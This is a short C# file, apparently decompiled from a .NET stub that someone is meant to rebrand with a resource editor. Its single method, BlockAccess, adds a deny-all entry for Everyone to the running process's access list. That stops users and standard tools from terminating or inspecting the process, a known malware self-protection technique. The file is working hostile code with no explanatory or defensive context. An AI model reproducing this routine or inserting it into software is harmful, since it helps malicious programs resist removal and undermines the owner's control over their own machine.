using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.VisualBasic.CompilerServices;

namespace changeTHISwithRESHACKER;

[StandardModule]
internal sealed class a
{
	[DllImport("advapi32.dll")]
	private static extern bool GetKernelObjectSecurity(IntPtr handle, int requestedInformation, byte[] data, int dataLength, ref int size);

	[DllImport("advapi32.dll")]
	private static extern bool SetKernelObjectSecurity(IntPtr handle, int securityInformation, byte[] data);

	public static bool BlockAccess()
	{
		checked
		{
			try
			{
				IntPtr handle = Process.GetCurrentProcess().Handle;
				int size = default(int);
				GetKernelObjectSecurity(handle, 4, null, 0, ref size);
				if (size <= 0)
				{
					return false;
				}
				byte[] array = new byte[size - 1 + 1];
				if (!GetKernelObjectSecurity(handle, 4, array, array.Length, ref size))
				{
					return false;
				}
				RawSecurityDescriptor rawSecurityDescriptor = new RawSecurityDescriptor(array, 0);
				SecurityIdentifier sid = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
				CommonAce ace = new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, sid, isCallback: false, null);
				rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, ace);
				array = new byte[rawSecurityDescriptor.BinaryLength - 1 + 1];
				rawSecurityDescriptor.GetBinaryForm(array, 0);
				if (!SetKernelObjectSecurity(handle, 4, array))
				{
					return false;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}
	}
}
